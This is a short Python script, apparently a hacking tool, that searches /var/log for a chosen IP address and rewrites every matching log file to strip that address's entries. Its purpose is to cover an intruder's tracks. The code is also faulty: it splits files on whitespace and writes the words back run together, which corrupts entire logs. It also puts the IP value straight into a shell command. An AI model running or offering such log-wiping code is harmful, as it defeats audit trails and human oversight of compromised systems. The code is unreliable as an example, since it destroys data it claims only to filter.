####################
#Log manipulator
#
#This script will remove all logs associated to given IP address in a linux-based system. 
#This script will need root privileges to run succesfully.
####################

import os, re
ip = "x.x.x.x" # replace the ip address 
#files that have the log 
files = os.popen("grep -rl \""+ip+"\" /var/log/ ").read().splitlines()
#print(files)
lines=[]
for file in files:
    with open(file, "r+") as f:
        liness = f.read().split()
        f.seek(0)
        f.truncate()
    with open(file,"w") as f:
        for line in liness:
            if ip not in line:
                f.write(line)
print("logs erased with ip "+ip)